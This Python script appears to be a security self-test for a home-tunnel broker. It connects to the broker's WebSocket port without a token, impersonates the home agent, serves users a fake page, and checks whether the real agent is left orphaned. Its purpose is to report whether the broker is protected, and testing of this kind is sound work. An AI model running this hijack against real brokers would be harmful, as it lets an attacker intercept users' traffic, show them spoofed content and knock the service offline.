"""Attack: tunnel hijack (impersonating the home agent).

Connects to the broker's tunnel port WITHOUT a token and answers every request
with a fake page. Then it acts as a normal user and checks what the user sees.
It also checks whether the real agent is still served after the attacker leaves.

Vulnerable: broker accepts the connection, users get the attacker's page,
            and after the attacker disconnects the service stays at 502.
Protected:  broker rejects the handshake (401).

Usage: python attack_tunnel_hijack.py [--ws-url ws://127.0.0.1:8765] [--http-url http://127.0.0.1:8080]
Exit code: 0 = protected, 1 = vulnerable, 2 = setup error.
"""
import argparse
import asyncio
import json
import sys
import urllib.error
import urllib.request

from websockets.asyncio.client import connect

FAKE_PAGE = "<h1>Tunnel hijacked!</h1><p>This page comes from the attacker, not from your home.</p>"


def http_get(url):
    try:
        with urllib.request.urlopen(url, timeout=15) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


async def fake_agent(ws):
    async for msg in ws:
        req = json.loads(msg)
        print(f"[!] Intercepted user request: {req}")
        reply = {"status_code": 200, "headers": {"Content-Type": "text/html; charset=utf-8"},
                 "body": FAKE_PAGE, "is_base64": False}
        if "id" in req:
            reply["id"] = req["id"]
        await ws.send(json.dumps(reply))


async def main(ws_url, http_url):
    status, _ = await asyncio.to_thread(http_get, http_url + "/")
    if status != 200:
        print(f"[X] Setup error: the service is not reachable through the tunnel before the attack (HTTP {status}).")
        print("RESULT: tunnel hijack: SETUP_ERROR")
        return 2

    try:
        ws = await connect(ws_url)
    except Exception as e:
        print(f"[+] Broker rejected the connection without a token: {e}")
        print("RESULT: tunnel hijack: PROTECTED")
        return 0

    print(f"[!] Connected to {ws_url} without a token - the broker accepted us as 'home'.")
    task = asyncio.create_task(fake_agent(ws))
    status, body = await asyncio.to_thread(http_get, http_url + "/")
    hijacked = "Tunnel hijacked!" in body
    print(f"[!] A user opening {http_url}/ got: HTTP {status} {'FAKE PAGE' if hijacked else body[:60]!r}")
    await ws.close()
    task.cancel()

    await asyncio.sleep(3)
    status, _ = await asyncio.to_thread(http_get, http_url + "/")
    if status != 200:
        print(f"[!] After the attacker left the service is DOWN (HTTP {status}) - the real agent was orphaned.")
    else:
        print("[*] After the attacker left the service works again.")

    print(f"RESULT: tunnel hijack: {'VULNERABLE' if hijacked else 'PROTECTED'}")
    return 1 if hijacked else 0


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--ws-url", default="ws://127.0.0.1:8765")
    p.add_argument("--http-url", default="http://127.0.0.1:8080")
    a = p.parse_args()
    sys.exit(asyncio.run(main(a.ws_url, a.http_url.rstrip("/"))))
